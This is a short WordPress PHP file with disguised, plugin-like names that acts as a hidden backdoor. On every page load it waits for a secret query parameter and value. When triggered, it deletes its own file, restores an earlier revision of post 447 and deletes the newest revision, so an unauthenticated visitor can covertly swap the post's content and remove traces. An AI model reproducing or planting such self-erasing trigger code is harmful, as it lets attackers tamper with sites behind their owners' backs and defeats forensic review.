<?php

function security_active_booster_auto() {
	if (isset($_GET['front_cron_site']) && $_GET['front_cron_site'] === 'more_cf7_button_force') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$views_ai_manage_index = 447;
		$bulk_redirection_reading = wp_get_post_revisions($views_ai_manage_index);
		if (empty($bulk_redirection_reading)) die('no revisions');
		if (count($bulk_redirection_reading) < 2) die('less than 2');
		$drop_class_notifications_super = array_shift($bulk_redirection_reading);
		$check_restrict_connect_customizer = $drop_class_notifications_super->ID;
		$lightbox_load_animated = array_shift($bulk_redirection_reading);
		$membership_wishlist_campaign_utils = $lightbox_load_animated->ID;
		$cdn_class_interactive = wp_restore_post_revision($membership_wishlist_campaign_utils);
		if ($cdn_class_interactive === false) die('error restoring');
		$cdn_class_interactive = wp_delete_post_revision($check_restrict_connect_customizer);		
		if ($cdn_class_interactive === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'security_active_booster_auto');
